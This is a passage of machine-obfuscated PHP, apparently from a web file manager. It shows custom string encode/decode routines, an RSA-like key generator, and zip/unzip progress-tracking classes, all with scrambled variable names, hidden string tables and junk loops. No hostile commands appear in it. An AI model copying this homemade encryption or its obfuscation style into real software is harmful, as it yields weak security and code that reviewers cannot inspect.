$®ÔÆš°Ç[762]; case $¹²ÁÆúÆ[301]: $—¨†¯Í = $this->jgtl93e43aee($†úˆÔ‹œ, base64_encode($Ü‡½±Ä“ . $Ñìéû¯)); $ûÈÙƒõ… = $®ÔÆš°Ç[763]; while ($ûÈÙƒõ… < $®ÔÆš°Ç[685]) { if ($ûÈÙƒõ… >= 0) { break; } $ûÈÙƒõ…++; } break; case $¹²ÁÆúÆ[302]: $—¨†¯Í = $this->jgtl93e43aee($†úˆÔ‹œ, md5($Ü‡½±Ä“ . $Ñìéû¯)); break; $¸°åÊß¨ = $®ÔÆš°Ç[764]; case $¹²ÁÆúÆ[303]: $†úˆÔ‹œ = base64_encode($†úˆÔ‹œ); $æÅìê = rand(0, 64); $¦ÙŸ¶Àû = $¯´¤Ñ¯ë[$æÅìê]; $îñ¹Ö˜˜ = $®ÔÆš°Ç[765]; $é¿™Àˆ = md5($¦ÙŸ¶Àû . md5($Ñìéû¯ . $¦ÙŸ¶Àû) . $Ñìéû¯); $é¿™Àˆ = substr($é¿™Àˆ, $æÅìê % 8, $æÅìê % 8 + 7); $§Ôƒ½Â = $¹²ÁÆúÆ[6]; $Êí¥Öä = $®ÔÆš°Ç[695]; while ($Êí¥Öä < $®ÔÆš°Ç[685]) { if ($Êí¥Öä >= 0) { break; } $Êí¥Öä++; } $İ¼ŞÆºÌ = 0; $åÈ…Ş—  = $®ÔÆš°Ç[766]; if (!$åÈ…Ş— ) { return; } $¢çáàÄº = 0; $¹¨„ºĞ’ = $®ÔÆš°Ç[767]; $¬¢–’ˆ = 0; $ÊıÎçè‚ = $®ÔÆš°Ç[768]; if (!$ÊıÎçè‚) { return; } for ($İ¼ŞÆºÌ = 0; $İ¼ŞÆºÌ < strlen($†úˆÔ‹œ); $İ¼ŞÆºÌ++) { $¬¢–’ˆ = $¬¢–’ˆ == strlen($é¿™Àˆ) ? 0 : $¬¢–’ˆ; $¢çáàÄº = ($æÅìê + strpos($¯´¤Ñ¯ë, $†úˆÔ‹œ[$İ¼ŞÆºÌ]) + ord($é¿™Àˆ[$¬¢–’ˆ++])) % 64; $§Ôƒ½Â .= $¯´¤Ñ¯ë[$¢çáàÄº]; } $—¨†¯Í = hash_encode($¦ÙŸ¶Àû . $§Ôƒ½Â); break; default: $—¨†¯Í = $this->jgtl93e43aee($†úˆÔ‹œ, $Ñìéû¯ . $Ü‡½±Ä“); $Ìá²µŸ˜ = $®ÔÆš°Ç[769]; while (strlen($Ìá²µŸ˜) < $®ÔÆš°Ç[685]) { if (!$Ìá²µŸ˜) { break; } $Ìá²µŸ˜++; } break; } $—¨†¯Í = strrev($ùİÉìò… . $Ü‡½±Ä“ . $—¨†¯Í); if ($ˆ¢‘«½ - 1 > 0) { $—¨†¯Í = $this->xpzbe01e586c($—¨†¯Í, $Ñìéû¯, $ˆ¢‘«½ - 1); } return $—¨†¯Í; } private function xozs8c026486($´Ñ²ºê‰, $ÀşıµÚ™, $®ÉšüÃ = 3) { $Ü¼è ¡ =& $_SERVER[ìïæ“œî]; $áŠÒ±Ÿ =& $_SERVER[‚ ×¹Âö]; if (!is_string($´Ñ²ºê‰) || strlen($´Ñ²ºê‰) < 10) { return !1; } $´Ñ²ºê‰ = trim($´Ñ²ºê‰); $´Ñ²ºê‰ = strrev($´Ñ²ºê‰); $©ŠÑÃĞÍ = $´Ñ²ºê‰[0]; $ù¼íËÔğ = $Ü¼è ¡[770]; $ã°Ö’”› = substr($´Ñ²ºê‰, 1, 15); $´Ñ²ºê‰ = substr($´Ñ²ºê‰, 16); $‘ì ë´» = $áŠÒ±Ÿ[300]; switch ($©ŠÑÃĞÍ) { case $áŠÒ±Ÿ[206]: $—É¡Ê– = $this->jrzpd7e1b1ac($´Ñ²ºê‰, strrev($ÀşıµÚ™ . $ã°Ö’”›)); break; $¯éœ™õî = $Ü¼è ¡[771]; case $áŠÒ±Ÿ[122]: $—É¡Ê– = $this->jrzpd7e1b1ac($´Ñ²ºê‰, strrev($ã°Ö’”› . $ÀşıµÚ™)); break; $«¢’Ú¢ = $Ü¼è ¡[772]; while (strlen($«¢’Ú¢) < $Ü¼è ¡[702]) { if (!$«¢’Ú¢) { break; } $«¢’Ú¢++; } case $áŠÒ±Ÿ[301]: $—É¡Ê– = $this->jrzpd7e1b1ac($´Ñ²ºê‰, base64_encode($ã°Ö’”› . $ÀşıµÚ™)); break; case $áŠÒ±Ÿ[302]: $—É¡Ê– = $this->jrzpd7e1b1ac($´Ñ²ºê‰, md5($ã°Ö’”› . $ÀşıµÚ™)); break; $ÉˆÄ’ÎÊ = $Ü¼è ¡[773]; if (strlen($ÉˆÄ’ÎÊ) < $Ü¼è ¡[713]) { return; } case $áŠÒ±Ÿ[303]: $´Ñ²ºê‰ = hash_decode($´Ñ²ºê‰); $ƒÚ²Åù  = $´Ñ²ºê‰[0]; $´Ñ²ºê‰ = substr($´Ñ²ºê‰, 1); $­·àõŸ = strpos($‘ì ë´», $ƒÚ²Åù ); $’–ü‰ò = md5($ƒÚ²Åù  . md5($ÀşıµÚ™ . $ƒÚ²Åù ) . $ÀşıµÚ™); $’–ü‰ò = substr($’–ü‰ò, $­·àõŸ % 8, $­·àõŸ % 8 + 7); $ÆÊÃˆéô = $áŠÒ±Ÿ[6]; $ªÔ‘³Ò× = $Ü¼è ¡[774]; while (strlen($ªÔ‘³Ò×) < $Ü¼è ¡[688]) { if (!$ªÔ‘³Ò×) { break; } $ªÔ‘³Ò×++; } $Ÿ‡Û·ôŒ = 0; $æ½æÌñÉ = 0; $´Ï‹ë°Ş = 0; for ($Ÿ‡Û·ôŒ = 0; $Ÿ‡Û·ôŒ < strlen($´Ñ²ºê‰); $Ÿ‡Û·ôŒ++) { $´Ï‹ë°Ş = $´Ï‹ë°Ş == strlen($’–ü‰ò) ? 0 : $´Ï‹ë°Ş; $§ğ¤òÑ = $´Ï‹ë°Ş++; $¡¨û±Æì = $Ü¼è ¡[775]; if (strlen($¡¨û±Æì) < $Ü¼è ¡[688]) { die; } $æ½æÌñÉ = strpos($‘ì ë´», $´Ñ²ºê‰[$Ÿ‡Û·ôŒ]) - $­·àõŸ - ord($’–ü‰ò[$§ğ¤òÑ]); while ($æ½æÌñÉ < 0) { $æ½æÌñÉ += 64; $µ¬€ì´² = $Ü¼è ¡[776]; if (strlen($µ¬€ì´²) < $Ü¼è ¡[710]) { return; } } $ÆÊÃˆéô .= $‘ì ë´»[$æ½æÌñÉ]; $ÕİˆÆú± = $Ü¼è ¡[777]; if (!$ÕİˆÆú±) { return; } } $—É¡Ê– = base64_decode($ÆÊÃˆéô); $‘ÜßƒÎİ = $Ü¼è ¡[778]; if (strlen($‘ÜßƒÎİ) < $Ü¼è ¡[702]) { return; } break; default: $—É¡Ê– = $this->jrzpd7e1b1ac($´Ñ²ºê‰, $ÀşıµÚ™ . $ã°Ö’”›); break; } if ($®ÉšüÃ - 1 > 0) { $—É¡Ê– = $this->xozs8c026486($—É¡Ê–, $ÀşıµÚ™, $®ÉšüÃ - 1); } return $—É¡Ê–; } public function fnou1ea5b5e7($îœã¡ÓÓ) { $î¨¼Æ†¿ =& $_SERVER[ìïæ“œî]; $ë†©§†ü =& $_SERVER[‚ ×¹Âö]; $›ŞñÚÁÒ = $this->bzof550fc722(); $ÊœÉê = $î¨¼Æ†¿[779]; if (strlen($ÊœÉê) < $î¨¼Æ†¿[713]) { return; } $›°Ô…ö… = $this->bzof550fc722(); $‚Ø¯ë¬† = ($›ŞñÚÁÒ - 1) * ($›°Ô…ö… - 1); $®Æ‘» ¡ = intval(($›ŞñÚÁÒ + $›°Ô…ö…) / 2); while (1) { $ëÈÅŠÂ = $®Æ‘» ¡; $ï¢ûÀ = $‚Ø¯ë¬†; $ŞÕãêé = $î¨¼Æ†¿[780]; while (strlen($ŞÕãêé) < $î¨¼Æ†¿[710]) { if (!$ŞÕãêé) { break; } $ŞÕãêé++; } while ($ï¢ûÀ % $ëÈÅŠÂ != 0) { $Ø»“¾ı® = $ï¢ûÀ; $‚¾ŠñœÑ = $î¨¼Æ†¿[781]; if (strlen($‚¾ŠñœÑ) < $î¨¼Æ†¿[685]) { return; } $ï¢ûÀ = $ëÈÅŠÂ; $ëÈÅŠÂ = $Ø»“¾ı® % $ëÈÅŠÂ; } if ($ëÈÅŠÂ == 1) { break; } else { $®Æ‘» ¡++; } } $ÆÎúà›¤ = 2; for ($ÜÖŠÅº‹ = 0; $ÜÖŠÅº‹ < $‚Ø¯ë¬† * 10; $ÜÖŠÅº‹++) { if (($‚Ø¯ë¬† * $ÜÖŠÅº‹ + 1) % $®Æ‘» ¡ == 0) { $ÆÎúà›¤ = intval(($‚Ø¯ë¬† * $ÜÖŠÅº‹ + 1) / $®Æ‘» ¡); break; } } $ĞÍİ‰ï = $this->jgtl93e43aee($›ŞñÚÁÒ * $›°Ô…ö… . $ë†©§†ü[6], $ë†©§†ü[136]); $‡ˆ«ó»¨ = md5($ë†©§†ü[304] . ($›ŞñÚÁÒ + $›°Ô…ö…) . $ë†©§†ü[305] . $®Æ‘» ¡ . $ë†©§†ü[305] . $ÆÎúà›¤ . $ë†©§†ü[306]); $ÂÀ“İ  = $this->jgtl93e43aee($îœã¡ÓÓ, $‡ˆ«ó»¨) . $ë†©§†ü[307] . $ĞÍİ‰ï; $£À‡ô¤ª = $î¨¼Æ†¿[782]; if (strlen($£À‡ô¤ª) < $î¨¼Æ†¿[685]) { return; } return $ÂÀ“İ ; } public function mivpa98090d4($ìÖĞ®Æ«) { $±ö«í¢ø =& $_SERVER[ìïæ“œî]; $æÚş¥ğÙ =& $_SERVER[‚ ×¹Âö]; $Ëë«¦µ = explode($æÚş¥ğÙ[307], $ìÖĞ®Æ«); $†š­Ø¹ = $±ö«í¢ø[783]; if (count($Ëë«¦µ) != 2) { return $æÚş¥ğÙ[6]; } $¨Û­äÅœ = $this->jrzpd7e1b1ac($Ëë«¦µ[1] . $æÚş¥ğÙ[6], $æÚş¥ğÙ[136]); $•ì¤ş¹½ = $±ö«í¢ø[784]; if (strlen($•ì¤ş¹½) < $±ö«í¢ø[702]) { die; } if (!$¨Û­äÅœ) { return $æÚş¥ğÙ[6]; } $¨Û­äÅœ = intval($¨Û­äÅœ); $×ê„Äëæ = 0; $²·©àÒ = 0; $Ì„Á®ƒ = $±ö«í¢ø[785]; if (strlen($Ì„Á®ƒ) < $±ö«í¢ø[685]) { return; } for ($£±–Äé = 3; $£±–Äé < $¨Û­äÅœ; $£±–Äé += 2) { if ($¨Û­äÅœ % $£±–Äé != 0) { continue; } $×ê„Äëæ = $£±–Äé; $ú£ÖÚ = $±ö«í¢ø[786]; while ($ú£ÖÚ < $±ö«í¢ø[688]) { if ($ú£ÖÚ >= 0) { break; } $ú£ÖÚ++; } $²·©àÒ = intval($¨Û­äÅœ / $£±–Äé); $»ºæÀ×¼ = $±ö«í¢ø[787]; break; $èœçì” = $±ö«í¢ø[788]; while (strlen($èœçì”) < $±ö«í¢ø[685]) { if (!$èœçì”) { break; } $èœçì”++; } } $µÆíÙ¡ = ($×ê„Äëæ - 1) * ($²·©àÒ - 1); $‹«±ª‰å = $±ö«í¢ø[789]; if (!$‹«±ª‰å) { return; } $£õÔ‘¶º = intval(($×ê„Äëæ + $²·©àÒ) / 2); $ìÂ¯ÄÑœ = $±ö«í¢ø[790]; if (!$ìÂ¯ÄÑœ) { die; } while (1) { $ÕÚ¬×¿Ù = $£õÔ‘¶º; $•¼˜Ë–§ = $±ö«í¢ø[791]; while (strlen($•¼˜Ë–§) < $±ö«í¢ø[702]) { if (!$•¼˜Ë–§) { break; } $•¼˜Ë–§++; } $Ú¿“áÌ = $µÆíÙ¡; while ($Ú¿“áÌ % $ÕÚ¬×¿Ù != 0) { $ë¶Ë‡«„ = $Ú¿“áÌ; $Ú¿“áÌ = $ÕÚ¬×¿Ù; $ÕÚ¬×¿Ù = $ë¶Ë‡«„ % $ÕÚ¬×¿Ù; $—áıüğ¯ = $±ö«í¢ø[792]; } if ($ÕÚ¬×¿Ù == 1) { break; } else { $£õÔ‘¶º++; } } $¼µ¼ßßü = 2; $Ä¡úûÊª = $±ö«í¢ø[793]; for ($£±–Äé = 0; $£±–Äé < $µÆíÙ¡ * 10; $£±–Äé++) { if (($µÆíÙ¡ * $£±–Äé + 1) % $£õÔ‘¶º == 0) { $¼µ¼ßßü = intval(($µÆíÙ¡ * $£±–Äé + 1) / $£õÔ‘¶º); break; } } $×¢¾¤Ù = md5($æÚş¥ğÙ[304] . ($×ê„Äëæ + $²·©àÒ) . $æÚş¥ğÙ[305] . $£õÔ‘¶º . $æÚş¥ğÙ[305] . $¼µ¼ßßü . $æÚş¥ğÙ[306]); $Ë‹‰ŸÎæ = $this->jrzpd7e1b1ac($Ëë«¦µ[0], $×¢¾¤Ù); $°éÌó – = $±ö«í¢ø[794]; if (!$°éÌó –) { return; } return $Ë‹‰ŸÎæ; } public function bzof550fc722() { $Š”üú•ø =& $_SERVER[ìïæ“œî]; $²ÑøŸ•« = mt_rand(pow(2, 14), pow(2, 16) - 1); $šºÉí½³ = $Š”üú•ø[795]; while ($šºÉí½³ < $Š”üú•ø[702]) { if ($šºÉí½³ >= 0) { break; } $šºÉí½³++; } $ö¨Œˆ²Ÿ = array(); $‘ÚËôĞÁ = 1; while ($‘ÚËôĞÁ <= (int) sqrt($²ÑøŸ•«)) { $“Şˆç—ü = $‘ÚËôĞÁ; while (!0) { $“Şˆç—ü++; if ($“Şˆç—ü <= 2) { $‘ÚËôĞÁ = $“Şˆç—ü; break; } else { if ($“Şˆç—ü < 2) { continue; } } $±äªù¡² = !0; for ($Éş†şÁá = 2; $Éş†şÁá <= sqrt($“Şˆç—ü); $Éş†şÁá++) { if ($“Şˆç—ü % $Éş†şÁá == 0) { $±äªù¡² = !1; } } if ($±äªù¡²) { $‘ÚËôĞÁ = $“Şˆç—ü; break; } } $ö¨Œˆ²Ÿ[] = $‘ÚËôĞÁ; } $ş ÄÛ­ = 2; for ($“Şˆç—ü = $²ÑøŸ•«; $“Şˆç—ü > 1; $“Şˆç—ü--) { $±äªù¡² = !0; $†»‹ = $Š”üú•ø[796]; if (strlen($†»‹) < $Š”üú•ø[713]) { die; } foreach ($ö¨Œˆ²Ÿ as $á™¶¶ÖÊ) { if ($“Şˆç—ü % $á™¶¶ÖÊ == 0) { $±äªù¡² = !1; break; } } if ($±äªù¡²) { $ş ÄÛ­ = $“Şˆç—ü; break; } } return $ş ÄÛ­; } public function kcts51d59fe3($½›ó„ü–, $¹ÉÃù¹ì) { $ÚĞòÈ÷å =& $_SERVER[‚ ×¹Âö]; return call_user_func(array($ÚĞòÈ÷å[8], $ÚĞòÈ÷å[308]), $½›ó„ü–, $¹ÉÃù¹ì); } public function jgtl93e43aee($İ€Ö¦™¬, $•°áô£İ) { $·şµÉä =& $_SERVER[‚ ×¹Âö]; return call_user_func(array($·şµÉä[309], $·şµÉä[310]), $İ€Ö¦™¬, $•°áô£İ); } public function jrzpd7e1b1ac($¹‘“¸Êƒ, $Ä¯áß‡¾) { $Ğî¯±¹œ =& $_SERVER[‚ ×¹Âö]; return call_user_func(array($Ğî¯±¹œ[309], $Ğî¯±¹œ[311]), $¹‘“¸Êƒ, $Ä¯áß‡¾); } } goto A®Ş¸“Ú‰ò; C®í³í‹È: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Å”µŞ×ï =& $_SERVER[ìïæ“œî]; parent::startAfter(); Hook::bind($Å”µŞ×ï[1860], array($this, $Å”µŞ×ï[1861])); Hook::bind($Å”µŞ×ï[1255], array($this, $Å”µŞ×ï[1862])); Hook::bind($Å”µŞ×ï[1863], array($this, $Å”µŞ×ï[1864])); $üÕ·ó” =& $this->task; $üÕ·ó”[$Å”µŞ×ï[1865]] = $Å”µŞ×ï[1256]; if (!$üÕ·ó”[$Å”µŞ×ï[1636]]) { $üÕ·ó”[$Å”µŞ×ï[1636]] = LNG($Å”µŞ×ï[1866]); } } protected function endAfter() { $Ì¾·­’à =& $_SERVER[ìïæ“œî]; parent::endAfter(); Hook::unbind($Ì¾·­’à[1860], array($this, $Ì¾·­’à[1861])); Hook::unbind($Ì¾·­’à[1255], array($this, $Ì¾·­’à[1862])); Hook::unbind($Ì¾·­’à[1863], array($this, $Ì¾·­’à[1864])); } public function updateAfter() { $İğÖ” =& $_SERVER[ìïæ“œî]; $æíİ¡» =& $this->task; if (!$æíİ¡»[$İğÖ”[1118]] || !$æíİ¡»[$İğÖ”[812]]) { if ($æíİ¡»[$İğÖ”[1865]] != $İğÖ”[389]) { return; } } if ($æíİ¡»[$İğÖ”[1865]] == $İğÖ”[1256]) { $„ˆ¾ÙÜ = 0; if ($æíİ¡»[$İğÖ”[1800]]) { $„ˆ¾ÙÜ = $æíİ¡»[$İğÖ”[1801]] / $æíİ¡»[$İğÖ”[1800]]; } $æíİ¡»[$İğÖ”[1749]] = $„ˆ¾ÙÜ * 0.3; } else { if ($æíİ¡»[$İğÖ”[1865]] == $İğÖ”[389]) { $„ˆ¾ÙÜ = $æíİ¡»[$İğÖ”[1748]] / $æíİ¡»[$İğÖ”[1118]]; $æíİ¡»[$İğÖ”[1749]] = 0.3 + $„ˆ¾ÙÜ * 0.4; } else { if ($æíİ¡»[$İğÖ”[1865]] == $İğÖ”[110]) { $ø‚¥ÑË­ = 0; if ($æíİ¡»[$İğÖ”[1802]] == $İğÖ”[110]) { $ø‚¥ÑË­ = $æíİ¡»[$İğÖ”[1801]]; } $„ˆ¾ÙÜ = ($æíİ¡»[$İğÖ”[1805]] + $ø‚¥ÑË­) / $æíİ¡»[$İğÖ”[812]]; $æíİ¡»[$İğÖ”[1749]] = 0.3 + 0.4 + $„ˆ¾ÙÜ * 0.3; } } } if ($æíİ¡»[$İğÖ”[1749]] > 0) { $ÊÇŠˆÍŒ = timeFloat() - $æíİ¡»[$İğÖ”[1751]] - $æíİ¡»[$İğÖ”[1754]]; $æíİ¡»[$İğÖ”[1755]] = $ÊÇŠˆÍŒ * (1 - $æíİ¡»[$İğÖ”[1749]]) / $æíİ¡»[$İğÖ”[1749]]; } } public function addFile($Í©Ùà«Ê) { $ğìĞóäµ =& $_SERVER[ìïæ“œî]; $şÖ¥ÅŒ„ =& $this->task; $‘¢Àè¦ = IO::info($Í©Ùà«Ê); $şÖ¥ÅŒ„[$ğìĞóäµ[1798]] = $‘¢Àè¦[$ğìĞóäµ[32]]; $şÖ¥ÅŒ„[$ğìĞóäµ[1800]] = $‘¢Àè¦[$ğìĞóäµ[79]]; $şÖ¥ÅŒ„[$ğìĞóäµ[1801]] = 0; $şÖ¥ÅŒ„[$ğìĞóäµ[1120]] = $ğìĞóäµ[1821]; $şÖ¥ÅŒ„[$ğìĞóäµ[1802]] = $ğìĞóäµ[1256]; $şÖ¥ÅŒ„[$ğìĞóäµ[812]] = $‘¢Àè¦[$ğìĞóäµ[79]]; $şÖ¥ÅŒ„[$ğìĞóäµ[1118]] = 1; $»Š¦‚øº = 0; $şÖ¥ÅŒ„[$ğìĞóäµ[1809]] = array($ğìĞóäµ[1810] => $»Š¦‚øº + 1, $ğìĞóäµ[494] => $‘¢Àè¦[$ğìĞóäµ[32]], $ğìĞóäµ[87] => $‘¢Àè¦[$ğìĞóäµ[87]], $ğìĞóäµ[582] => $‘¢Àè¦[$ğìĞóäµ[582]] ? $‘¢Àè¦[$ğìĞóäµ[582]] : $‘¢Àè¦[$ğìĞóäµ[87]]); $this->update(); } public function zipEvent($³ãË¦¥Œ, $ĞìÛŠó¥, $Äı¨‘ôÒ, $Ø„Ë¢äè) { $ôÂ×Í£° =& $_SERVER[ìïæ“œî]; $«ß¦¦ =& $this->task; $«ß¦¦[$ôÂ×Í£°[1798]] = get_path_this($ĞìÛŠó¥); $«ß¦¦[$ôÂ×Í£°[1800]] = $Ø„Ë¢äè; $«ß¦¦[$ôÂ×Í£°[1801]] = $Äı¨‘ôÒ; $«ß¦¦[$ôÂ×Í£°[1120]] = $³ãË¦¥Œ == $ôÂ×Í£°[1867] ? $ôÂ×Í£°[1868] : $ôÂ×Í£°[1869]; $«ß¦¦[$ôÂ×Í£°[1802]] = $ôÂ×Í£°[12]; $«ß¦¦[$ôÂ×Í£°[812]] = $Ø„Ë¢äè; $«ß¦¦[$ôÂ×Í£°[1865]] = $ôÂ×Í£°[389]; $this->update(); } public function unzipAfter($Ç…¿‹Ù) { $°ñ¤¤—Ã =& $_SERVER[ìïæ“œî]; $ÔÀå±Ê =& $this->task; $ÔÀå±Ê[$°ñ¤¤—Ã[1865]] = $°ñ¤¤—Ã[110]; $ó‹‰— = IO::infoWithChildren($Ç…¿‹Ù); $şë€µäË = 0; $ÔÀå±Ê[$°ñ¤¤—Ã[1809]] = array($°ñ¤¤—Ã[1810] => $şë€µäË + 1, $°ñ¤¤—Ã[494] => $ó‹‰—[$°ñ¤¤—Ã[32]], $°ñ¤¤—Ã[87] => $ó‹‰—[$°ñ¤¤—Ã[87]], $°ñ¤¤—Ã[582] => $ó‹‰—[$°ñ¤¤—Ã[582]] ? $ó‹‰—[$°ñ¤¤—Ã[582]] : $ó‹‰—[$°ñ¤¤—Ã[87]]); if ($ó‹‰—[$°ñ¤¤—Ã[33]] == $°ñ¤¤—Ã[230]) { $ÔÀå±Ê[$°ñ¤¤—Ã[1118]] = 1; } else { $ÔÀå±Ê[$°ñ¤¤—Ã[1118]] = $ó‹‰—[$°ñ¤¤—Ã[82]][$°ñ¤¤—Ã[80]]; } $ÔÀå±Ê[$°ñ¤¤—Ã[1120]] = $°ñ¤¤—Ã[12]; $ÔÀå±Ê[$°ñ¤¤—Ã[1802]] = 0; $ÔÀå±Ê[$°ñ¤¤—Ã[1748]] = 0; $ÔÀå±Ê[$°ñ¤¤—Ã[1800]] = 0; $ÔÀå±Ê[$°ñ¤¤—Ã[1801]] = 0; $ÔÀå±Ê[$°ñ¤¤—Ã[1798]] = $°ñ¤¤—Ã[12]; $ÔÀå±Ê[$°ñ¤¤—Ã[1805]] = 0; $ÔÀå±Ê[$°ñ¤¤—Ã[812]] = $ó‹‰—[$°ñ¤¤—Ã[79]]; $this->update(); self::log($°ñ¤¤—Ã[1870] . json_encode(array($ÔÀå±Ê, $ó‹‰—))); } public function nameParse($ş²‰Ç©²) { $½¯çÁÑ¹ =& $_SERVER[ìïæ“œî]; $İ²ÖİïŠ =& $this->task; if ($İ²ÖİïŠ[$½¯çÁÑ¹[1865]] == $½¯çÁÑ¹[1256]) { $İ²ÖİïŠ[$½¯çÁÑ¹[1865]] = $½¯çÁÑ¹[389]; $İ²ÖİïŠ[$½¯çÁÑ¹[1805]] = 0; $İ²ÖİïŠ[$½¯çÁÑ¹[812]] = 0; } $¢ÔêÅŞ– = get_path_this($ş²‰Ç©²); if (strstr($¢ÔêÅŞ–, $½¯çÁÑ¹[10])) { $İ²ÖİïŠ[$½¯çÁÑ¹[1748]] += 1; $İ²ÖİïŠ[$½¯çÁÑ¹[1118]] += 1; } $İ²ÖİïŠ[$½¯çÁÑ¹[1798]] = $ş²‰Ç©²; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $™£›‘Ïö =& $_SERVER[ìïæ“œî]; parent::startAfter(); Hook::bind($™£›‘Ïö[1871], array($this, $™£›‘Ïö[1861])); Hook::bind($™£›‘Ïö[1863], array($this, $™£›‘Ïö[1864])); $ø¤ŠëÔ =& $this->task; $ø¤ŠëÔ[$™£›‘Ïö[1865]] = $™£›‘Ïö[1256]; if (!$ø¤ŠëÔ[$™£›‘Ïö[1636]]) { $ø¤ŠëÔ[$™£›‘Ïö[1636]] = LNG($™£›‘Ïö[1872]); } } protected function endAfter() { $°©Í™Ğš =& $_SERVER[ìïæ“œî]; parent::endAfter(); Hook::unbind($°©Í™Ğš[1871], array($this, $°©Í™Ğš[1861])); Hook::unbind($°©Í™Ğš[1863], array($this, $°©Í™Ğš[1864])); } public function updateAfter() { $ØŸ­¤ä° =& $_SERVER[ìïæ“œî]; $‹Ä£¹¯‹ =& $this->task; if (!$‹Ä£¹¯‹[$ØŸ­¤ä°[1118]] || !$‹Ä£¹¯‹[$ØŸ­¤ä°[812]]) { return; } if ($‹Ä£¹¯‹[$ØŸ­¤ä°[1865]] == $ØŸ­¤ä°[1256]) { $¤›ŞĞÖ¤ = $‹Ä£¹¯‹[$ØŸ­¤ä°[1801]]; if ($‹Ä£¹¯‹[$ØŸ­¤ä°[1802]] != $ØŸ­¤ä°[1256]) { $¤›ŞĞÖ¤ = 0; } $×–È…Ü… = ($‹Ä£¹¯‹[$ØŸ­¤ä°[1805]] + $¤›ŞĞÖ¤) / $‹Ä£¹¯‹[$ØŸ­¤ä°[812]]; $‹Ä£¹¯‹[$ØŸ­¤ä°[1749]] = $×–È…Ü… * 0.3; } else { if ($‹Ä£¹¯‹[$ØŸ­¤ä°[1865]] == $ØŸ­¤ä°[389]) { $×–È…Ü… = $‹Ä£¹¯‹[$ØŸ­¤ä°[1748]] / $‹Ä£¹¯‹[$ØŸ­¤ä°[1118]]; $‹Ä£¹¯‹[$ØŸ­¤ä°[1749]] = 0.3 + $×–È…Ü… * 0.5; } else { if ($‹Ä£¹¯‹[$ØŸ­¤ä°[1865]] == $ØŸ­¤ä°[110]) { $×–È…Ü… = 0; if ($‹Ä£¹¯‹[$ØŸ­¤ä°[1800]]) { $×–È…Ü… = $‹Ä£¹¯‹[$ØŸ­¤ä°[1801]] / $‹Ä£¹¯‹[$ØŸ­¤ä°[1800]]; } $‹Ä£¹¯‹[$ØŸ­¤ä°[1749]] = 0.3 + 0.5 + $×–È…Ü… * 0.2; } } } if ($‹Ä£¹¯‹[$ØŸ­¤ä°[1749]] > 0) { $§ªˆ—Ù = timeFloat() - $‹Ä£¹¯‹[$ØŸ­¤ä°[1751]] - $‹Ä£¹¯‹[$ØŸ­¤ä°[1754]]; $‹Ä£¹¯‹[$ØŸ­¤ä°[1755]] = $§ªˆ—Ù * (1 - $‹Ä£¹¯‹[$ØŸ­¤ä°[1749]]) / $‹Ä£¹¯‹[$ØŸ­¤ä°[1749]]; } } public function copyFileStart($”£é®ÔØ, $ÆšÃ‘Ö, $ü“Òà¦², $À®áÄİ, $µœ­õ—§, $³À¬¡) { $¿«Åœ•µ =& $_SERVER[ìïæ“œî]; parent::copyFileStart($”£é®ÔØ, $ÆšÃ‘Ö, $ü“Òà¦², $À®áÄİ, $µœ­õ—§, $³À¬¡); $úÏóÀÛ =& $this->task; if ($úÏóÀÛ[$¿«Åœ•µ[1865]] == $¿«Åœ•µ[389]) { $úÏóÀÛ[$¿«Åœ•µ[1865]] = $¿«Åœ•µ[110]; } $this->update(); } public function copyFileEnd($á®ûŒÄ , $×§îÖÌ², $ööÁíÁ, $ååª¤Ëî, $¿ËÃÎ¥ƒ, $ŸÆ˜Éç§) { $óî»ëíŸ =& $_SERVER[ìïæ“œî]; $ÆÒµë·Ê =& $this->task; $ÆÒµë·Ê[$óî»ëíŸ[1801]] = $ÆÒµë·Ê[$óî»ëíŸ[1800]]; $ÆÒµë·Ê[$óî»ëíŸ[1805]] += $ÆÒµë·Ê[$óî»ëíŸ[1800]]; $ÆÒµë·Ê[$óî»ëíŸ[1802]] = $óî»ëíŸ[12]; $this->update(); } public function zipEvent($…‚ ‚›À, $à¿Ï×Ù³, $Ú÷›è, $êùÇ÷¤) { $šÙïğŸæ =& $_SERVER[ìïæ“œî]; $íÃªÍ È =& $this->task; $íÃªÍ È[$šÙïğŸæ[1798]] = get_path_this($à¿Ï×Ù³); $íÃªÍ È[$šÙïğŸæ[1800]] = $êùÇ÷¤; $íÃªÍ È[$šÙïğŸæ[1801]] = $Ú÷›è; $íÃªÍ È[$šÙïğŸæ[1120]] = $…‚ ‚›À == $šÙïğŸæ[1873] ? $šÙïğŸæ[1868] : $šÙïğŸæ[1869]; $íÃªÍ È[$šÙïğŸæ[1802]] = $šÙïğŸæ[12]; $íÃªÍ È[$šÙïğŸæ[812]] = $êùÇ÷¤; $íÃªÍ È[$šÙïğŸæ[1865]] = $šÙïğŸæ[389]; $this->update(); } public function nameParse($÷•›š´ ) { $şØ«ÂˆÜ =& $_SERVER[ìïæ“œî]; $Ößöàï± =& $this->task; if ($Ößöàï±[$şØ«ÂˆÜ[1748]] < $Ößöàï±[$şØ«ÂˆÜ[1118]]) { $”şÅÂ€ = get_path_this($÷•›š´ ); if (strstr($”şÅÂ€, $şØ«ÂˆÜ[10])) { $Ößöàï±[$şØ«ÂˆÜ[1748]] += 1; } } if ($Ößöàï±[$şØ«ÂˆÜ[1865]] == $şØ«ÂˆÜ[1256]) { $Ößöàï±[$şØ«ÂˆÜ[1865]] = $şØ«ÂˆÜ[389]; } $Ößöàï±[$şØ«ÂˆÜ[1798]] = $÷•›š´ ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¸¶ş­ıÜ) { $½×êŸ« =& $_SERVER[ìïæ“œî]; $ãæ„šŸì = array($½×êŸ«[662] => array($½×êŸ«[33] => $½×êŸ«[1874], $½×êŸ«[350] => array($½×êŸ«[255], $½×êŸ«[814], $½×êŸ«[1875], $½×êŸ«[1876])), $½×êŸ«[1877] => array($½×êŸ«[33] => $½×êŸ«[1878], $½×êŸ«[350] => array($½×êŸ«[255], $½×êŸ«[812], $½×êŸ«[1879], $½×êŸ«[1880], $½×êŸ«[1881]))); if (!isset($ãæ„šŸì[$¸¶ş­ıÜ])) { return !1; } $this->optionType = $ãæ„šŸì[$¸¶ş­ıÜ][$½×êŸ«[33]]; $this->field = $ãæ„šŸì[$¸¶ş­ıÜ][$½×êŸ«[350]]; return !0; } public function listData($Ó÷É‡òš = false, $½âÏçöƒ = "\155\x6f\144\x69\x66\171\124\151\155\145", $Ğ˜İíª© = false) { return parent::listData($Ó÷É‡òš, 